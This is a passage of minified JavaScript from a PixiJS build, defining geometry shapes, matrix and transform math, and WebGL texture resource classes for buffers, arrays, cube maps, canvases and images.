0===e&&(e=.001);var i=Math.ceil((this.x+this.width-e)*t)/t,r=Math.ceil((this.y+this.height-e)*t)/t;return this.x=Math.floor((this.x+e)*t)/t,this.y=Math.floor((this.y+e)*t)/t,this.width=i-this.x,this.height=r-this.y,this},t.prototype.enlarge=function(t){var e=Math.min(this.x,t.x),i=Math.max(this.x+this.width,t.x+t.width),r=Math.min(this.y,t.y),n=Math.max(this.y+this.height,t.y+t.height);return this.x=e,this.width=i-e,this.y=r,this.height=n-r,this},t.prototype.toString=function(){return"[@pixi/math:Rectangle x="+this.x+" y="+this.y+" width="+this.width+" height="+this.height+"]"},t}(),Tc=function(){function t(t,e,i){void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=0),this.x=t,this.y=e,this.radius=i,this.type=pc.CIRC}return t.prototype.clone=function(){return new t(this.x,this.y,this.radius)},t.prototype.contains=function(t,e){if(this.radius<=0)return!1;var i=this.radius*this.radius,r=this.x-t,n=this.y-e;return(r*=r)+(n*=n)<=i},t.prototype.getBounds=function(){return new bc(this.x-this.radius,this.y-this.radius,2*this.radius,2*this.radius)},t.prototype.toString=function(){return"[@pixi/math:Circle x="+this.x+" y="+this.y+" radius="+this.radius+"]"},t}(),Dc=function(){function t(t,e,i,r){void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=0),this.x=t,this.y=e,this.width=i,this.height=r,this.type=pc.ELIP}return t.prototype.clone=function(){return new t(this.x,this.y,this.width,this.height)},t.prototype.contains=function(t,e){if(this.width<=0||this.height<=0)return!1;var i=(t-this.x)/this.width,r=(e-this.y)/this.height;return(i*=i)+(r*=r)<=1},t.prototype.getBounds=function(){return new bc(this.x-this.width,this.y-this.height,this.width,this.height)},t.prototype.toString=function(){return"[@pixi/math:Ellipse x="+this.x+" y="+this.y+" width="+this.width+" height="+this.height+"]"},t}(),wc=function(){function t(){for(var t=arguments,e=[],i=0;i<arguments.length;i++)e[i]=t[i];var r=Array.isArray(e[0])?e[0]:e;if("number"!=typeof r[0]){for(var n=[],s=0,o=r.length;s<o;s++)n.push(r[s].x,r[s].y);r=n}this.points=r,this.type=pc.POLY,this.closeStroke=!0}return t.prototype.clone=function(){var e=new t(this.points.slice());return e.closeStroke=this.closeStroke,e},t.prototype.contains=function(t,e){for(var i=!1,r=this.points.length/2,n=0,s=r-1;n<r;s=n++){var o=this.points[2*n],a=this.points[2*n+1],h=this.points[2*s],u=this.points[2*s+1];a>e!=u>e&&t<(e-a)/(u-a)*(h-o)+o&&(i=!i)}return i},t.prototype.toString=function(){return"[@pixi/math:PolygoncloseStroke="+this.closeStroke+"points="+this.points.reduce((function(t,e){return t+", "+e}),"")+"]"},t}(),Sc=function(){function t(t,e,i,r,n){void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=0),void 0===n&&(n=20),this.x=t,this.y=e,this.width=i,this.height=r,this.radius=n,this.type=pc.RREC}return t.prototype.clone=function(){return new t(this.x,this.y,this.width,this.height,this.radius)},t.prototype.contains=function(t,e){if(this.width<=0||this.height<=0)return!1;if(t>=this.x&&t<=this.x+this.width&&e>=this.y&&e<=this.y+this.height){var i=Math.max(0,Math.min(this.radius,Math.min(this.width,this.height)/2));if(e>=this.y+i&&e<=this.y+this.height-i||t>=this.x+i&&t<=this.x+this.width-i)return!0;var r=t-(this.x+i),n=e-(this.y+i),s=i*i;if(r*r+n*n<=s)return!0;if((r=t-(this.x+this.width-i))*r+n*n<=s)return!0;if(r*r+(n=e-(this.y+this.height-i))*n<=s)return!0;if((r=t-(this.x+i))*r+n*n<=s)return!0}return!1},t.prototype.toString=function(){return"[@pixi/math:RoundedRectangle x="+this.x+" y="+this.y+"width="+this.width+" height="+this.height+" radius="+this.radius+"]"},t}(),Ac=function(){function t(t,e,i,r){void 0===i&&(i=0),void 0===r&&(r=0),this._x=i,this._y=r,this.cb=t,this.scope=e}return t.prototype.clone=function(e,i){return void 0===e&&(e=this.cb),void 0===i&&(i=this.scope),new t(e,i,this._x,this._y)},t.prototype.set=function(t,e){return void 0===t&&(t=0),void 0===e&&(e=t),this._x===t&&this._y===e||(this._x=t,this._y=e,this.cb.call(this.scope)),this},t.prototype.copyFrom=function(t){return this._x===t.x&&this._y===t.y||(this._x=t.x,this._y=t.y,this.cb.call(this.scope)),this},t.prototype.copyTo=function(t){return t.set(this._x,this._y),t},t.prototype.equals=function(t){return t.x===this._x&&t.y===this._y},t.prototype.toString=function(){return"[@pixi/math:ObservablePoint x=0 y=0 scope="+this.scope+"]"},Object.defineProperty(t.prototype,"x",{get:function(){return this._x},set:function(t){this._x!==t&&(this._x=t,this.cb.call(this.scope))},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"y",{get:function(){return this._y},set:function(t){this._y!==t&&(this._y=t,this.cb.call(this.scope))},enumerable:!1,configurable:!0}),t}(),Cc=function(){function t(t,e,i,r,n,s){void 0===t&&(t=1),void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=1),void 0===n&&(n=0),void 0===s&&(s=0),this.array=null,this.a=t,this.b=e,this.c=i,this.d=r,this.tx=n,this.ty=s}return t.prototype.fromArray=function(t){this.a=t[0],this.b=t[1],this.c=t[3],this.d=t[4],this.tx=t[2],this.ty=t[5]},t.prototype.set=function(t,e,i,r,n,s){return this.a=t,this.b=e,this.c=i,this.d=r,this.tx=n,this.ty=s,this},t.prototype.toArray=function(t,e){this.array||(this.array=new Float32Array(9));var i=e||this.array;return t?(i[0]=this.a,i[1]=this.b,i[2]=0,i[3]=this.c,i[4]=this.d,i[5]=0,i[6]=this.tx,i[7]=this.ty,i[8]=1):(i[0]=this.a,i[1]=this.c,i[2]=this.tx,i[3]=this.b,i[4]=this.d,i[5]=this.ty,i[6]=0,i[7]=0,i[8]=1),i},t.prototype.apply=function(t,e){e=e||new xc;var i=t.x,r=t.y;return e.x=this.a*i+this.c*r+this.tx,e.y=this.b*i+this.d*r+this.ty,e},t.prototype.applyInverse=function(t,e){e=e||new xc;var i=1/(this.a*this.d+this.c*-this.b),r=t.x,n=t.y;return e.x=this.d*i*r+-this.c*i*n+(this.ty*this.c-this.tx*this.d)*i,e.y=this.a*i*n+-this.b*i*r+(-this.ty*this.a+this.tx*this.b)*i,e},t.prototype.translate=function(t,e){return this.tx+=t,this.ty+=e,this},t.prototype.scale=function(t,e){return this.a*=t,this.d*=e,this.c*=t,this.b*=e,this.tx*=t,this.ty*=e,this},t.prototype.rotate=function(t){var e=Math.cos(t),i=Math.sin(t),r=this.a,n=this.c,s=this.tx;return this.a=r*e-this.b*i,this.b=r*i+this.b*e,this.c=n*e-this.d*i,this.d=n*i+this.d*e,this.tx=s*e-this.ty*i,this.ty=s*i+this.ty*e,this},t.prototype.append=function(t){var e=this.a,i=this.b,r=this.c,n=this.d;return this.a=t.a*e+t.b*r,this.b=t.a*i+t.b*n,this.c=t.c*e+t.d*r,this.d=t.c*i+t.d*n,this.tx=t.tx*e+t.ty*r+this.tx,this.ty=t.tx*i+t.ty*n+this.ty,this},t.prototype.setTransform=function(t,e,i,r,n,s,o,a,h){return this.a=Math.cos(o+h)*n,this.b=Math.sin(o+h)*n,this.c=-Math.sin(o-a)*s,this.d=Math.cos(o-a)*s,this.tx=t-(i*this.a+r*this.c),this.ty=e-(i*this.b+r*this.d),this},t.prototype.prepend=function(t){var e=this.tx;if(1!==t.a||0!==t.b||0!==t.c||1!==t.d){var i=this.a,r=this.c;this.a=i*t.a+this.b*t.c,this.b=i*t.b+this.b*t.d,this.c=r*t.a+this.d*t.c,this.d=r*t.b+this.d*t.d}return this.tx=e*t.a+this.ty*t.c+t.tx,this.ty=e*t.b+this.ty*t.d+t.ty,this},t.prototype.decompose=function(t){var e=this.a,i=this.b,r=this.c,n=this.d,s=t.pivot,o=-Math.atan2(-r,n),a=Math.atan2(i,e),h=Math.abs(o+a);return h<1e-5||Math.abs(vc-h)<1e-5?(t.rotation=a,t.skew.x=t.skew.y=0):(t.rotation=0,t.skew.x=o,t.skew.y=a),t.scale.x=Math.sqrt(e*e+i*i),t.scale.y=Math.sqrt(r*r+n*n),t.position.x=this.tx+(s.x*e+s.y*r),t.position.y=this.ty+(s.x*i+s.y*n),t},t.prototype.invert=function(){var t=this.a,e=this.b,i=this.c,r=this.d,n=this.tx,s=t*r-e*i;return this.a=r/s,this.b=-e/s,this.c=-i/s,this.d=t/s,this.tx=(i*this.ty-r*n)/s,this.ty=-(t*this.ty-e*n)/s,this},t.prototype.identity=function(){return this.a=1,this.b=0,this.c=0,this.d=1,this.tx=0,this.ty=0,this},t.prototype.clone=function(){var e=new t;return e.a=this.a,e.b=this.b,e.c=this.c,e.d=this.d,e.tx=this.tx,e.ty=this.ty,e},t.prototype.copyTo=function(t){return t.a=this.a,t.b=this.b,t.c=this.c,t.d=this.d,t.tx=this.tx,t.ty=this.ty,t},t.prototype.copyFrom=function(t){return this.a=t.a,this.b=t.b,this.c=t.c,this.d=t.d,this.tx=t.tx,this.ty=t.ty,this},t.prototype.toString=function(){return"[@pixi/math:Matrix a="+this.a+" b="+this.b+" c="+this.c+" d="+this.d+" tx="+this.tx+" ty="+this.ty+"]"},Object.defineProperty(t,"IDENTITY",{get:function(){return new t},enumerable:!1,configurable:!0}),Object.defineProperty(t,"TEMP_MATRIX",{get:function(){return new t},enumerable:!1,configurable:!0}),t}(),Ic=[1,1,0,-1,-1,-1,0,1,1,1,0,-1,-1,-1,0,1],Rc=[0,1,1,1,0,-1,-1,-1,0,1,1,1,0,-1,-1,-1],Pc=[0,-1,-1,-1,0,1,1,1,0,1,1,1,0,-1,-1,-1],Oc=[1,1,0,-1,-1,-1,0,1,-1,-1,0,1,1,1,0,-1],Nc=[],Mc=[],Fc=Math.sign;!function(){for(var t=0;t<16;t++){var e=[];Nc.push(e);for(var i=0;i<16;i++)for(var r=Fc(Ic[t]*Ic[i]+Pc[t]*Rc[i]),n=Fc(Rc[t]*Ic[i]+Oc[t]*Rc[i]),s=Fc(Ic[t]*Pc[i]+Pc[t]*Oc[i]),o=Fc(Rc[t]*Pc[i]+Oc[t]*Oc[i]),a=0;a<16;a++)if(Ic[a]===r&&Rc[a]===n&&Pc[a]===s&&Oc[a]===o){e.push(a);break}}for(t=0;t<16;t++){var h=new Cc;h.set(Ic[t],Rc[t],Pc[t],Oc[t],0,0),Mc.push(h)}}();var Lc={E:0,SE:1,S:2,SW:3,W:4,NW:5,N:6,NE:7,MIRROR_VERTICAL:8,MAIN_DIAGONAL:10,MIRROR_HORIZONTAL:12,REVERSE_DIAGONAL:14,uX:function(t){return Ic[t]},uY:function(t){return Rc[t]},vX:function(t){return Pc[t]},vY:function(t){return Oc[t]},inv:function(t){return 8&t?15&t:7&-t},add:function(t,e){return Nc[t][e]},sub:function(t,e){return Nc[t][Lc.inv(e)]},rotate180:function(t){return 4^t},isVertical:function(t){return 2==(3&t)},byDirection:function(t,e){return 2*Math.abs(t)<=Math.abs(e)?e>=0?Lc.S:Lc.N:2*Math.abs(e)<=Math.abs(t)?t>0?Lc.E:Lc.W:e>0?t>0?Lc.SE:Lc.SW:t>0?Lc.NE:Lc.NW},matrixAppendRotationInv:function(t,e,i,r){void 0===i&&(i=0),void 0===r&&(r=0);var n=Mc[Lc.inv(e)];n.tx=i,n.ty=r,t.append(n)}},Bc=function(){function t(){this.worldTransform=new Cc,this.localTransform=new Cc,this.position=new Ac(this.onChange,this,0,0),this.scale=new Ac(this.onChange,this,1,1),this.pivot=new Ac(this.onChange,this,0,0),this.skew=new Ac(this.updateSkew,this,0,0),this._rotation=0,this._cx=1,this._sx=0,this._cy=0,this._sy=1,this._localID=0,this._currentLocalID=0,this._worldID=0,this._parentID=0}return t.prototype.onChange=function(){this._localID++},t.prototype.updateSkew=function(){this._cx=Math.cos(this._rotation+this.skew.y),this._sx=Math.sin(this._rotation+this.skew.y),this._cy=-Math.sin(this._rotation-this.skew.x),this._sy=Math.cos(this._rotation-this.skew.x),this._localID++},t.prototype.toString=function(){return"[@pixi/math:Transform position=("+this.position.x+", "+this.position.y+") rotation="+this.rotation+" scale=("+this.scale.x+", "+this.scale.y+") skew=("+this.skew.x+", "+this.skew.y+") ]"},t.prototype.updateLocalTransform=function(){var t=this.localTransform;this._localID!==this._currentLocalID&&(t.a=this._cx*this.scale.x,t.b=this._sx*this.scale.x,t.c=this._cy*this.scale.y,t.d=this._sy*this.scale.y,t.tx=this.position.x-(this.pivot.x*t.a+this.pivot.y*t.c),t.ty=this.position.y-(this.pivot.x*t.b+this.pivot.y*t.d),this._currentLocalID=this._localID,this._parentID=-1)},t.prototype.updateTransform=function(t){var e=this.localTransform;if(this._localID!==this._currentLocalID&&(e.a=this._cx*this.scale.x,e.b=this._sx*this.scale.x,e.c=this._cy*this.scale.y,e.d=this._sy*this.scale.y,e.tx=this.position.x-(this.pivot.x*e.a+this.pivot.y*e.c),e.ty=this.position.y-(this.pivot.x*e.b+this.pivot.y*e.d),this._currentLocalID=this._localID,this._parentID=-1),this._parentID!==t._worldID){var i=t.worldTransform,r=this.worldTransform;r.a=e.a*i.a+e.b*i.c,r.b=e.a*i.b+e.b*i.d,r.c=e.c*i.a+e.d*i.c,r.d=e.c*i.b+e.d*i.d,r.tx=e.tx*i.a+e.ty*i.c+i.tx,r.ty=e.tx*i.b+e.ty*i.d+i.ty,this._parentID=t._worldID,this._worldID++}},t.prototype.setFromMatrix=function(t){t.decompose(this),this._localID++},Object.defineProperty(t.prototype,"rotation",{get:function(){return this._rotation},set:function(t){this._rotation!==t&&(this._rotation=t,this.updateSkew())},enumerable:!1,configurable:!0}),t.IDENTITY=new t,t}();Fl.PREFER_ENV=Ml.any?Ku.WEBGL:Ku.WEBGL2,Fl.STRICT_TEXTURE_CACHE=!1;var Uc=[];function kc(t,e){if(!t)return null;var i="";if("string"==typeof t){var r=/\.(\w{3,4})(?:$|\?|#)/i.exec(t);r&&(i=r[1].toLowerCase())}for(var n=Uc.length-1;n>=0;--n){var s=Uc[n];if(s.test&&s.test(t,i))return new s(t,e)}throw new Error("Unrecognized source type to auto-detect Resource")}var Gc=function(t,e){return(Gc=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)};function Hc(t,e){function i(){this.constructor=t}Gc(t,e),t.prototype=null===e?Object.create(e):(i.prototype=e.prototype,new i)}var zc=function(){return(zc=Object.assign||function(t){for(var e,i=arguments,r=1,n=arguments.length;r<n;r++)for(var s in e=i[r])Object.prototype.hasOwnProperty.call(e,s)&&(t[s]=e[s]);return t}).apply(this,arguments)},Vc=function(){function t(t,e){void 0===t&&(t=0),void 0===e&&(e=0),this._width=t,this._height=e,this.destroyed=!1,this.internal=!1,this.onResize=new dc("setRealSize"),this.onUpdate=new dc("update"),this.onError=new dc("onError")}return t.prototype.bind=function(t){this.onResize.add(t),this.onUpdate.add(t),this.onError.add(t),(this._width||this._height)&&this.onResize.emit(this._width,this._height)},t.prototype.unbind=function(t){this.onResize.remove(t),this.onUpdate.remove(t),this.onError.remove(t)},t.prototype.resize=function(t,e){t===this._width&&e===this._height||(this._width=t,this._height=e,this.onResize.emit(t,e))},Object.defineProperty(t.prototype,"valid",{get:function(){return!!this._width&&!!this._height},enumerable:!1,configurable:!0}),t.prototype.update=function(){this.destroyed||this.onUpdate.emit()},t.prototype.load=function(){return Promise.resolve(this)},Object.defineProperty(t.prototype,"width",{get:function(){return this._width},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"height",{get:function(){return this._height},enumerable:!1,configurable:!0}),t.prototype.style=function(t,e,i){return!1},t.prototype.dispose=function(){},t.prototype.destroy=function(){this.destroyed||(this.destroyed=!0,this.dispose(),this.onError.removeAll(),this.onError=null,this.onResize.removeAll(),this.onResize=null,this.onUpdate.removeAll(),this.onUpdate=null)},t.test=function(t,e){return!1},t}(),Xc=function(t){function e(e,i){var r=this,n=i||{},s=n.width,o=n.height;if(!s||!o)throw new Error("BufferResource width or height invalid");return(r=t.call(this,s,o)||this).data=e,r}return Hc(e,t),e.prototype.upload=function(t,e,i){var r=t.gl;r.pixelStorei(r.UNPACK_PREMULTIPLY_ALPHA_WEBGL,e.alphaMode===ul.UNPACK);var n=e.realWidth,s=e.realHeight;return i.width===n&&i.height===s?r.texSubImage2D(e.target,0,0,0,n,s,e.format,i.type,this.data):(i.width=n,i.height=s,r.texImage2D(e.target,0,i.internalFormat,n,s,0,e.format,i.type,this.data)),!0},e.prototype.dispose=function(){this.data=null},e.test=function(t){return t instanceof Float32Array||t instanceof Uint8Array||t instanceof Uint32Array},e}(Vc),jc={scaleMode:ol.NEAREST,format:il.RGBA,alphaMode:ul.NPM},$c=function(t){function e(e,i){void 0===e&&(e=null),void 0===i&&(i=null);var r=t.call(this)||this,n=(i=i||{}).alphaMode,s=i.mipmap,o=i.anisotropicLevel,a=i.scaleMode,h=i.width,u=i.height,l=i.wrapMode,c=i.format,d=i.type,p=i.target,f=i.resolution,g=i.resourceOptions;return!e||e instanceof Vc||((e=kc(e,g)).internal=!0),r.resolution=f||Fl.RESOLUTION,r.width=Math.round((h||0)*r.resolution)/r.resolution,r.height=Math.round((u||0)*r.resolution)/r.resolution,r._mipmap=void 0!==s?s:Fl.MIPMAP_TEXTURES,r.anisotropicLevel=void 0!==o?o:Fl.ANISOTROPIC_LEVEL,r._wrapMode=l||Fl.WRAP_MODE,r._scaleMode=void 0!==a?a:Fl.SCALE_MODE,r.format=c||il.RGBA,r.type=d||nl.UNSIGNED_BYTE,r.target=p||rl.TEXTURE_2D,r.alphaMode=void 0!==n?n:ul.UNPACK,r.uid=Jl(),r.touched=0,r.isPowerOfTwo=!1,r._refreshPOT(),r._glTextures={},r.dirtyId=0,r.dirtyStyleId=0,r.cacheId=null,r.valid=h>0&&u>0,r.textureCacheIds=[],r.destroyed=!1,r.resource=null,r._batchEnabled=0,r._batchLocation=0,r.parentTextureArray=null,r.setResource(e),r}return Hc(e,t),Object.defineProperty(e.prototype,"realWidth",{get:function(){return Math.round(this.width*this.resolution)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"realHeight",{get:function(){return Math.round(this.height*this.resolution)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"mipmap",{get:function(){return this._mipmap},set:function(t){this._mipmap!==t&&(this._mipmap=t,this.dirtyStyleId++)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"scaleMode",{get:function(){return this._scaleMode},set:function(t){this._scaleMode!==t&&(this._scaleMode=t,this.dirtyStyleId++)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"wrapMode",{get:function(){return this._wrapMode},set:function(t){this._wrapMode!==t&&(this._wrapMode=t,this.dirtyStyleId++)},enumerable:!1,configurable:!0}),e.prototype.setStyle=function(t,e){var i;return void 0!==t&&t!==this.scaleMode&&(this.scaleMode=t,i=!0),void 0!==e&&e!==this.mipmap&&(this.mipmap=e,i=!0),i&&this.dirtyStyleId++,this},e.prototype.setSize=function(t,e,i){return i=i||this.resolution,this.setRealSize(t*i,e*i,i)},e.prototype.setRealSize=function(t,e,i){return this.resolution=i||this.resolution,this.width=Math.round(t)/this.resolution,this.height=Math.round(e)/this.resolution,this._refreshPOT(),this.update(),this},e.prototype._refreshPOT=function(){this.isPowerOfTwo=Yl(this.realWidth)&&Yl(this.realHeight)},e.prototype.setResolution=function(t){var e=this.resolution;return e===t||(this.resolution=t,this.valid&&(this.width=Math.round(this.width*e)/t,this.height=Math.round(this.height*e)/t,this.emit("update",this)),this._refreshPOT()),this},e.prototype.setResource=function(t){if(this.resource===t)return this;if(this.resource)throw new Error("Resource can be set only once");return t.bind(this),this.resource=t,this},e.prototype.update=function(){this.valid?(this.dirtyId++,this.dirtyStyleId++,this.emit("update",this)):this.width>0&&this.height>0&&(this.valid=!0,this.emit("loaded",this),this.emit("update",this))},e.prototype.onError=function(t){this.emit("error",this,t)},e.prototype.destroy=function(){this.resource&&(this.resource.unbind(this),this.resource.internal&&this.resource.destroy(),this.resource=null),this.cacheId&&(delete sc[this.cacheId],delete nc[this.cacheId],this.cacheId=null),this.dispose(),e.removeFromCache(this),this.textureCacheIds=null,this.destroyed=!0},e.prototype.dispose=function(){this.emit("dispose",this)},e.prototype.castToBaseTexture=function(){return this},e.from=function(t,i,r){void 0===r&&(r=Fl.STRICT_TEXTURE_CACHE);var n="string"==typeof t,s=null;if(n)s=t;else{if(!t._pixiId){var o=i&&i.pixiIdPrefix||"pixiid";t._pixiId=o+"_"+Jl()}s=t._pixiId}var a=sc[s];if(n&&r&&!a)throw new Error('The cacheId "'+s+'" does not exist in BaseTextureCache.');return a||((a=new e(t,i)).cacheId=s,e.addToCache(a,s)),a},e.fromBuffer=function(t,i,r,n){t=t||new Float32Array(i*r*4);var s=new Xc(t,{width:i,height:r}),o=t instanceof Float32Array?nl.FLOAT:nl.UNSIGNED_BYTE;return new e(s,Object.assign(jc,n||{width:i,height:r,type:o}))},e.addToCache=function(t,e){e&&(-1===t.textureCacheIds.indexOf(e)&&t.textureCacheIds.push(e),sc[e]&&console.warn("BaseTexture added to the cache with an id ["+e+"] that already had an entry"),sc[e]=t)},e.removeFromCache=function(t){if("string"==typeof t){var e=sc[t];if(e){var i=e.textureCacheIds.indexOf(t);return i>-1&&e.textureCacheIds.splice(i,1),delete sc[t],e}}else if(t&&t.textureCacheIds){for(var r=0;r<t.textureCacheIds.length;++r)delete sc[t.textureCacheIds[r]];return t.textureCacheIds.length=0,t}return null},e._globalBatch=0,e}(Ll),Wc=function(t){function e(e,i){var r=this,n=i||{},s=n.width,o=n.height;(r=t.call(this,s,o)||this).items=[],r.itemDirtyIds=[];for(var a=0;a<e;a++){var h=new $c;r.items.push(h),r.itemDirtyIds.push(-2)}return r.length=e,r._load=null,r.baseTexture=null,r}return Hc(e,t),e.prototype.initFromArray=function(t,e){for(var i=0;i<this.length;i++)t[i]&&(t[i].castToBaseTexture?this.addBaseTextureAt(t[i].castToBaseTexture(),i):t[i]instanceof Vc?this.addResourceAt(t[i],i):this.addResourceAt(kc(t[i],e),i))},e.prototype.dispose=function(){for(var t=0,e=this.length;t<e;t++)this.items[t].destroy();this.items=null,this.itemDirtyIds=null,this._load=null},e.prototype.addResourceAt=function(t,e){if(!this.items[e])throw new Error("Index "+e+" is out of bounds");return t.valid&&!this.valid&&this.resize(t.width,t.height),this.items[e].setResource(t),this},e.prototype.bind=function(e){if(null!==this.baseTexture)throw new Error("Only one base texture per TextureArray is allowed");t.prototype.bind.call(this,e);for(var i=0;i<this.length;i++)this.items[i].parentTextureArray=e,this.items[i].on("update",e.update,e)},e.prototype.unbind=function(e){t.prototype.unbind.call(this,e);for(var i=0;i<this.length;i++)this.items[i].parentTextureArray=null,this.items[i].off("update",e.update,e)},e.prototype.load=function(){var t=this;if(this._load)return this._load;var e=this.items.map((function(t){return t.resource})).filter((function(t){return t})).map((function(t){return t.load()}));return this._load=Promise.all(e).then((function(){var e=t.items[0],i=e.realWidth,r=e.realHeight;return t.resize(i,r),Promise.resolve(t)})),this._load},e}(Vc),Yc=function(t){function e(e,i){var r,n,s=this,o=i||{},a=o.width,h=o.height;return Array.isArray(e)?(r=e,n=e.length):n=e,s=t.call(this,n,{width:a,height:h})||this,r&&s.initFromArray(r,i),s}return Hc(e,t),e.prototype.addBaseTextureAt=function(t,e){if(!t.resource)throw new Error("ArrayResource does not support RenderTexture");return this.addResourceAt(t.resource,e),this},e.prototype.bind=function(e){t.prototype.bind.call(this,e),e.target=rl.TEXTURE_2D_ARRAY},e.prototype.upload=function(t,e,i){var r=this,n=r.length,s=r.itemDirtyIds,o=r.items,a=t.gl;i.dirtyId<0&&a.texImage3D(a.TEXTURE_2D_ARRAY,0,i.internalFormat,this._width,this._height,n,0,e.format,i.type,null);for(var h=0;h<n;h++){var u=o[h];s[h]<u.dirtyId&&(s[h]=u.dirtyId,u.valid&&a.texSubImage3D(a.TEXTURE_2D_ARRAY,0,0,0,h,u.resource.width,u.resource.height,1,e.format,i.type,u.resource.source))}return!0},e}(Wc),qc=function(t){function e(e){var i=this,r=e,n=r.naturalWidth||r.videoWidth||r.width,s=r.naturalHeight||r.videoHeight||r.height;return(i=t.call(this,n,s)||this).source=e,i.noSubImage=!1,i}return Hc(e,t),e.crossOrigin=function(t,e,i){void 0===i&&0!==e.indexOf("data:")?t.crossOrigin=function(t,e){if(void 0===e&&(e=globalThis.location),0===t.indexOf("data:"))return"";e=e||globalThis.location,ic||(ic=document.createElement("a")),ic.href=t;var i=kl.parse(ic.href),r=!i.port&&""===e.port||i.port===e.port;return i.hostname===e.hostname&&r&&i.protocol===e.protocol?"":"anonymous"}(e):!1!==i&&(t.crossOrigin="string"==typeof i?i:"anonymous")},e.prototype.upload=function(t,e,i,r){var n=t.gl,s=e.realWidth,o=e.realHeight;if((r=r||this.source)instanceof HTMLImageElement){if(!r.complete||0===r.naturalWidth)return!1}else if(r instanceof HTMLVideoElement&&r.readyState<=1)return!1;return n.pixelStorei(n.UNPACK_PREMULTIPLY_ALPHA_WEBGL,e.alphaMode===ul.UNPACK),this.noSubImage||e.target!==n.TEXTURE_2D||i.width!==s||i.height!==o?(i.width=s,i.height=o,n.texImage2D(e.target,0,i.internalFormat,e.format,i.type,r)):n.texSubImage2D(n.TEXTURE_2D,0,0,0,e.format,i.type,r),!0},e.prototype.update=function(){if(!this.destroyed){var e=this.source,i=e.naturalWidth||e.videoWidth||e.width,r=e.naturalHeight||e.videoHeight||e.height;this.resize(i,r),t.prototype.update.call(this)}},e.prototype.dispose=function(){this.source=null},e}(Vc),Zc=function(t){function e(e){return t.call(this,e)||this}return Hc(e,t),e.test=function(t){var e=globalThis.OffscreenCanvas;return!!(e&&t instanceof e)||globalThis.HTMLCanvasElement&&t instanceof HTMLCanvasElement},e}(qc),Kc=function(t){function e(i,r){var n=this,s=r||{},o=s.width,a=s.height,h=s.autoLoad,u=s.linkBaseTexture;if(i&&i.length!==e.SIDES)throw new Error("Invalid length. Got "+i.length+", expected 6");n=t.call(this,6,{width:o,height:a})||this;for(var l=0;l<e.SIDES;l++)n.items[l].target=rl.TEXTURE_CUBE_MAP_POSITIVE_X+l;return n.linkBaseTexture=!1!==u,i&&n.initFromArray(i,r),!1!==h&&n.load(),n}return Hc(e,t),e.prototype.bind=function(e){t.prototype.bind.call(this,e),e.target=rl.TEXTURE_CUBE_MAP},e.prototype.addBaseTextureAt=function(t,e,i){if(!this.items[e])throw new Error("Index "+e+" is out of bounds");if(!this.linkBaseTexture||t.parentTextureArray||Object.keys(t._glTextures).length>0){if(!t.resource)throw new Error("CubeResource does not support copying of renderTexture.");this.addResourceAt(t.resource,e)}else t.target=rl.TEXTURE_CUBE_MAP_POSITIVE_X+e,t.parentTextureArray=this.baseTexture,this.items[e]=t;return t.valid&&!this.valid&&this.resize(t.realWidth,t.realHeight),this.items[e]=t,this},e.prototype.upload=function(t,i,r){for(var n=this.itemDirtyIds,s=0;s<e.SIDES;s++){var o=this.items[s];(n[s]<o.dirtyId||r.dirtyId<i.dirtyId)&&(o.valid&&o.resource?(o.resource.upload(t,o,r),n[s]=o.dirtyId):n[s]<-1&&(t.gl.texImage2D(o.target,0,r.internalFormat,i.realWidth,i.realHeight,0,i.format,r.type,null),n[s]=-1))}return!0},e.test=function(t){return Array.isArray(t)&&t.length===e.SIDES},e.SIDES=6,e}(Wc),Qc=function(t){function e(e,i){var r=this;if(i=i||{},!(e instanceof HTMLImageElement)){var n=new Image;qc.crossOrigin(n,e,i.crossorigin),n.src=e,e=n}return r=t.call(this,e)||this,!e.complete&&r._width&&r._height&&(r._width=0,r._height=0),r.url=e.src,r._process=null,r.preserveBitmap=!1,r.createBitmap=(void 0!==i.createBitmap?i.createBitmap:Fl.CREATE_IMAGE_BITMAP)&&!!globalThis.createImageBitmap,r.alphaMode="number"==typeof i.alphaMode?i.alphaMode:null,r.bitmap=null,r._load=null,!1!==i.autoLoad&&r.load(),r}return Hc(e,t),e.prototype.load=function(t){var e=this;return this._load||(void 0!==t&&(this.createBitmap=t),this._load=new Promise((function(t,i){var r=e.source;e.url=r.src;var n=function(){e.destroyed||(r.onload=null,r.onerror=null,e.resize(r.width,r.height),e._load=null,e.createBitmap?t(e.process()):t(e))};r.complete&&r.src?n():(r.onload=n,r.onerror=function(t){i(t),e.onError.emit(t)})}))),this._load},e.prototype.process=function(){var t=this,e=this.source;if(null!==this._process)return this._process;if(null!==this.bitmap||!globalThis.createImageBitmap)return Promise.resolve(this);var i=globalThis.createImageBitmap,r=!e.crossOrigin||"anonymous"===e.crossOrigin;return this._process=fetch(e.src,{mode:r?"cors":"no-cors"}).then((function(t){return t.blob()})).then((function(r){return i(r,0,0,e.width,e.height,{premultiplyAlpha:t.alphaMode===ul.UNPACK?"premultiply":"none"})})).then((function(e){return t.destroyed?Promise.reject():(t.bitmap=e,t.update(),t._process=null,Promise.resolve(t))})),this._process},e.prototype.upload=function(e,i,r){if("number"==typeof this.alphaMode&&(i.alphaMode=this.alphaMode),!this.createBitmap)return t.prototype.upload.call(this,e,i,r);if(!this.bitmap&&(this.process(),!this.bitmap))return!1;if(t.prototype.upload.call(this,e,i,r,this.bitmap),!this.preserveBitmap){var n=!0,s=i._glTextures;for(var o in s){var a=s[o];if(a!==r&&a.dirtyId!==i.dirtyId){n=!1;break}}n&&(this.bitmap.close&&this.bitmap.close(),this.bitmap=null)}return!0},e.prototype.dispose=function(){this.source.onload=null,this.source.onerror=null,t.prototype.dispose.call(this),this.bitmap&&(this.bitmap.close(),this.bitmap=null),this._process=null,this._load=null},e.test=function(t){return"string"==typeof t||t instanceof HTMLImageElement},e}(qc),Jc=function(t){function 